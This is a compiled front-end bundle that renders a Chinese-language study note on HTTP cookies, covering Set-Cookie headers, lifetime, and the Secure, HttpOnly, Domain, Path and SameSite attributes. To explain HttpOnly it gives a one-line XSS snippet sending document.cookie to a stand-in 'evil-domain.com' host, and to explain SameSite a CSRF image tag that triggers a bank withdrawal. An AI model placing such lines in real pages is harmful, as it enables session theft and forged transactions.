(window.webpackJsonp=window.webpackJsonp||[]).push([[27],{413:function(t,s,a){"use strict";a.r(s);var e=a(1),o=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"cookies"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookies"}},[t._v("#")]),t._v(" cookies")]),t._v(" "),a("h2",{attrs:{id:"cookie是什么"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie是什么"}},[t._v("#")]),t._v(" cookie是什么")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("服务器发送到浏览器并保存在本地的一段数据（标记用户身份）")])]),t._v(" "),a("li",[a("p",[t._v("会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器")])]),t._v(" "),a("li",[a("p",[t._v("浏览器的每次请求都会携带cookie数据，带来额外性能开销")])]),t._v(" "),a("li",[a("p",[t._v("使基于无状态的HTTP协议记录状态信息成为了可能")]),t._v(" "),a("blockquote",[a("p",[t._v("Set-Cookie: id=a3fWa; "),a("strong",[t._v("Expires")]),t._v("=Wed, 21 Oct 2015 07:28:00 GMT; "),a("strong",[t._v("Secure")]),t._v("; "),a("strong",[t._v("HttpOnly")]),t._v("; key=value; "),a("strong",[t._v("SameSite")]),t._v("=Strict")])])])]),t._v(" "),a("h2",{attrs:{id:"怎么创建cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#怎么创建cookie"}},[t._v("#")]),t._v(" 怎么创建cookie")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("服务器收到HTTP请求时，在响应头添加Set-Cookie选项")]),t._v(" "),a("blockquote",[a("p",[t._v("HTTP/1.0 200 OK "),a("br"),t._v("\nContent-type: text/html"),a("br"),t._v("\nSet-Cookie: yummy_cookie=choco"),a("br"),t._v("\nSet-Cookie: tasty_cookie=strawberry"),a("br")])]),t._v(" "),a("p",[t._v("Nodejs中：")]),t._v(" "),a("div",{staticClass:"language-JS line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("response"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("setHeader")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Set-Cookie'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'foo=bar'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'bar=baz'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])])]),t._v(" "),a("li",[a("p",[t._v("浏览器将之前保存的cookie信息通过Cookie请求头再发送给服务器")]),t._v(" "),a("blockquote",[a("p",[t._v("GET /sample_page.html HTTP/1.1 "),a("br"),t._v("\nHost: www.example.org "),a("br"),t._v("\nCookie: yummy_cookie=choco; tasty_cookie=strawberry")])])])]),t._v(" "),a("h2",{attrs:{id:"怎么定义cookie的生命周期"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#怎么定义cookie的生命周期"}},[t._v("#")]),t._v(" 怎么定义cookie的生命周期")]),t._v(" "),a("ul",[a("li",[t._v("会话期：仅在会话期内有效")]),t._v(" "),a("li",[t._v("持久性：过期时间Expires或有效期Max-Age")])]),t._v(" "),a("h2",{attrs:{id:"怎么限制访问cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#怎么限制访问cookie"}},[t._v("#")]),t._v(" 怎么限制访问cookie")]),t._v(" "),a("ul",[a("li",[t._v("Secure属性\n"),a("ul",[a("li",[t._v("只会通过被HTTPS协议加密过的请求发送给服务器")])])]),t._v(" "),a("li",[t._v("HttpOnly属性\n"),a("ul",[a("li",[t._v("JS API无法访问带有HttpOnly属性的cookie")]),t._v(" "),a("li",[t._v("缓解XSS攻击(跨站脚本): HttpOnly类型的cookie阻止了JS对其的访问")])]),t._v(" "),a("div",{staticClass:"language-JS line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Image")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://www.evil-domain.com/steal-cookie.php?cookie="')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])])])]),t._v(" "),a("h2",{attrs:{id:"cookie的作用域有哪些"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie的作用域有哪些"}},[t._v("#")]),t._v(" cookie的作用域有哪些")]),t._v(" "),a("ul",[a("li",[t._v("Domain属性：指定了哪些主机可以接收接受cookie\n"),a("ul",[a("li",[t._v("Domain=mozilla.org")])])]),t._v(" "),a("li",[t._v("Path属性：指定了主机下哪些路径可以接收接受cookie\n"),a("ul",[a("li",[t._v("Path=/docs")])])]),t._v(" "),a("li",[t._v("SameSite属性：允许服务器要求某个cookie在跨站请求时不会被发送\n"),a("ul",[a("li",[t._v("阻止CSRF（跨站请求伪造攻击）")]),t._v(" "),a("li",[t._v("None值：浏览器可以在同站+跨站下发送cookie")]),t._v(" "),a("li",[t._v("Strict值：浏览器只在同站点时发送cookie")]),t._v(" "),a("li",[t._v("Lax值：浏览器只在同站点时发送cookie，从外部站点导航至URL时除外（通过链接）")])]),t._v(" "),a("div",{staticClass:"language-JS line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("img src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])])])])])}),[],!1,null,null,null);s.default=o.exports}}]);